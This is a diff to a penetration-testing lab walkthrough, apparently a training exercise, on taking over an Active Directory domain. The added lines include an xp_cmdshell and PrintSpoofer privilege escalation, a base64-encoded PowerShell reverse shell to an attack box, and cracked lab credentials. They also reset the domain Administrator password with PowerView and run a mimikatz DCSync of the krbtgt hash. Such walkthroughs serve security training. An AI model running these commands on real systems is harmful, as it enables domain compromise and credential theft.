@@ -386,13 +386,14 @@ sudo impacket-smbserver pwnd ~/my_share -smb2support -username koen -password ko
 Then within a the SQL prompt execute the following command to copy it:
 ```
 EXEC xp_cmdshell 'net use Z: \\172.16.7.240\pwnd koen /user:koen && Z:\PrintSpoofer.exe PrintSpoofer.exe'
-``
+```
 
 Let's elevate privileges and then spawn an reverse shell.
 First start the listener on the attack box:
 ```
 nc -lvnp 9001
 ```
+Then on the `SQL01` server execute to get a reverse shell (the code for the rev shell is obtained from `revshells.com`)
 ```
 EXEC xp_cmdshell 'Z:\PrintSpoofer.exe -c "powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA3AC4AMgA0ADAAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"'
 ```
@@ -465,11 +466,34 @@ Let's see if we can crack it with john:
 ```
 john hash.txt --wordlist=rockyou.txt
 ```
-We cracked it s
+We cracked it... the credentials are `CT059:charlie1`
+Next let's login use Powerview to reset the domain Administrator accounts password:
+
+```
+#Load Powerview
+. .\PowerView.ps1
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+Set-DomainUserPassword -Identity Administrator -AccountPassword $UserPassword
+```
+
+Now we can login using these credentials:
+```
+Enter-PSSession -ComputerName DC01 -Credential INLANEFREIGHT.LOCAL\Administrator
+```
+We have full control over the DC now...
+
+We can also do a DC-sync operation from MS01 and dump the NTLM hash of the krbtgt account:
+```
+./mimikatz.exe
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
+```
 
 
 
-#Other shit I tried:
+(if your current user does not have rights to do this but you have credentials to one which can do this visit:https://bloodhound.specterops.io/resources/edges/force-change-password for instrutions)
+
+
+# Other shit I tried:
 
 First export the tickets:
 ```
